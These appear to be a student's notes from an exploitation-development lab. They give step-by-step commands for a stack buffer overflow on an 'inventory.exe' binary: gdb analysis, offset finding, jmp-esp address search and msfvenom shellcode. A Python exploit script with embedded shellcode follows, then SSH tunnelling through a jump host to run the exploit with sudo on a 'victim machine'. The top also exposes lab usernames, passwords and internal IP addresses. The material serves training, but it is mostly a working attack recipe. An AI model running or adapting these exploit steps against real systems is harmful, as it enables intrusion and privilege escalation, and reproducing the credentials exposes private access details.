# Exploitation Development
## Stack INFO
```
--Stack Number
  5

--Username
CODA-503-M

--Password
Gx1LjlSgOgQJJMy

Boxes
Student - Password
--Linux ops
10.50.31.135
 
--Windows
10.50.24.133

--Jump
10.50.27.155

--Password
Gx1LjlSgOgQJJMy

--CTFd
http://10.50.20.30:8000/resources
```
## Common Commands cd ..
```
disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point
```
## Notes 
```
file func
strings func 
chmod u+x func

gdb ./func
run <<<$(echo "asdfasdfasdfasdf")
info functions
pdisass main
-> pdisass getuserinput

https://wiremask.eu/tools/buffer-overflow-pattern-generator/
use script to find where overflow occurs

run <<<$(python buff.py)

env - gdb ./func   -  (Ener without peda plugin)
show env
usnet env COLUMNS
unset env LINES

run 
AAAAAAAAAAAAAAAAAAAAAAaa
OVERFLOW

info proc map
** Take note of first start address after HEAP and End Address of STACK **
find /b 0xf7def000, 0xffffe000, 0xff ,0xe4
** 0xff is jump, 0xe4 ESP **
** Grab First Four Addresses from OutPut
** Break down -> each byte and reverse in ""
#0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f5 46 0f "\x0f\x46\xf5\xf7"

** Copy one of the reverse codes in "" and put in eip ""
** In terminal run msfvenom **
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python 
** COPY SHELL CODE  into script **

msfvenom --list payloads   
```
## Python Script
```
#!/usr/bin/env python
 buffer = "A" * 100
 eip = "BBBB"

#stack is inbetween 0xf7de1000 and 0xffffe0000
#0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f5 46 0f "\x0f\x46\xf5\xf7"

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

nop = "\x90" * 15
buf =  b""
buf += b"\xd9\xc2\xb8\x21\xce\x96\x0f\xd9\x74\x24\xf4\x5b"
buf += b"\x29\xc9\xb1\x0a\x31\x43\x19\x03\x43\x19\x83\xc3"
buf += b"\x04\xc3\x3b\xfc\x04\x5b\x5d\x53\x7d\x33\x70\x37"
buf += b"\x08\x24\xe2\x98\x79\xc2\xf3\x8e\x52\x70\x9d\x20"
buf += b"\x24\x97\x0f\x55\x35\x57\xb0\xa5\x53\x33\xb0\xf2"
buf += b"\xf0\x32\x51\x31\x76"
print(buffer+buf+nop+eip)
```
## Exercise Notes
```
file inventory.exe
  2 strings inventory.exe
  3 
  4 gdb ./inventory.exe
  5 run
  6 info functions
  7 info functions main
  8 
  9 pdisass main
 10 >    0x0804855e <+27>:  call   0x80484d6 <getTheGoods>
 11 
 12 pdisass getTheGoods
 13 
 14  0x080484f2 <+28>:  call   0x8048360 <printf@plt>
 15 ***  0x0804850f <+57>:  call   0x8048370 <fgets@plt>
 16 
 17 https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
 18 #Generate Pattern and Insert Pattern into script
 19 
 20 run <<<$(python buff.py)
 21 #Check EIP for Register Value
 22 #Set offset as part of A * Buffer
 23 
 24 #See Where Stack Starts and Ends by checking Start Address imm
    ediately following Heap and End Address on Stack
 25 info proc map
 26 
 27 #Switch to peda free gdb
 28 env - gdb ./inventory.exe
 29 unset env COLUMNS
 30 unset env LINES
 31 run
 32 #Overflow manually
 33 AAAAAAAAAAAAAAAAAAAAAAAAAAA-----
 34 
 35 find /b 0xf7de1000, 0xffffe000, 0xff ,0xe4
 36 ** Grab First Four Addresses from OutPut
 37 # Convert Memory Address to Little Endian
 38 ** Copy one of the reverse codes in "" and put in eip ""
 39 0xf7de3b59 -> "\x59 \x3b \xde \xf7"
 40 0xf7f588ab -> "\xab \x88 \xf5 \xf7"
 41 0xf7f645fb -> "\xfb \x45 \xf6 \xf7"
 42 0xf7f6460f -> "\x0f \x46 \xf6 \xf7"
 43 
 44 msfconsole 
 45 use payload /linux/x86/exec
 46 set CMD cat users
 47 generate -b "\x00" -f python
 48 
 49 #Take buf payload and input into script
 50 ** Copy one of the reverse codes in "" and put in eip "" if no
    t done
 51 # Troubleshoot script until it executes
 52 gdb ./inventory.exe

 53 run <<<#(python buff.py)
 55 #Restart Process and Generate Mem Addresses for victim machine
 56 ssh -S /tmp/jump dum -O forward -L 5152:192.168.28.111:2222
 57 ssh comrade@localhost -p 5152
 58 
 59 cd /
 60 ls -lisa
 61 cd .hidden
 62 gdb ./inventory.exe
 63 unset env LINES
 64 unset env COLUMNS
 65 
 66 run
 67 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 68 #Manual Overflow
 69 find /b 0xf7def000, 0xffffe000, 0xff ,0xe4
 70 0xf7df1b51 -> "\x51\x1b\xdf\xf7"
 71 
 72 # Change CMD with payload to match command needed
 73 # scp script to victim machine
 74 scp -P 5152 buff.py comrade@localhost:.
 75 sudo ./inventory.exe <<<$(python /home/comrade/buff.py)
```
